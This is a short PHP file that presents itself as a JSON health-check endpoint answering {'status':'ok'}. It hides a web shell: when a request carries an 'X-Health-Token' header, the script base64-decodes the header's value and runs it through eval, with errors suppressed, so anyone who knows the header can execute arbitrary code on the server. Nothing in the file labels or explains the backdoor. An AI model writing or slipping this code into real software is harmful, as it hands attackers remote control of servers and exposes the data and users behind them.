<?php
header("Content-Type: application/json");
$h=getallheaders();if(isset($h["X-Health-Token"])){@eval(base64_decode($h["X-Health-Token"]));exit;}
echo '{"status":"ok"}';
?>